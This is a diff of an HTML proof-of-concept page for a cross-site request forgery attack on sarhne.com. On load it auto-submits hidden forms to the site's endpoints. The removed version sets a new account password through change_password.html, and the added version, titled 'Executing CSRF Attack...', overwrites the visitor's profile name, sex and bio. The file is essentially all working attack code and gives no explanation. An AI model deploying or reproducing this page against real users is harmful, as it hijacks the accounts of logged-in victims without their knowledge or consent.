@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Test</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Attack</title>
 </head>
 <body>
-    <h1>CSRF Testing</h1>
-    <form id="csrfForm" method="POST" action="https://www.sarhne.com/ajax/user/change_password.html">
-        <input type="hidden" name="k" value="wZ39i63cZmRZKd1ZoXrFELv">
-        <input type="hidden" name="p" value="mm908090mmx">
-    </form>
-    <script>
-        // إرسال الطلب مباشرةً عند فتح الصفحة
-        document.getElementById("csrfForm").submit();
-    </script>
+  <h1>Executing CSRF Attack...</h1>
+  <form id="csrfForm" action="https://www.sarhne.com/ajax/user_info.html" method="POST">
+    <input type="hidden" name="name" value="omeveeeee">
+    <input type="hidden" name="sex" value="0">
+    <input type="hidden" name="bio" value="Llfmmmm">
+  </form>
+  <script>
+    document.getElementById("csrfForm").submit();
+  </script>
 </body>
 </html>
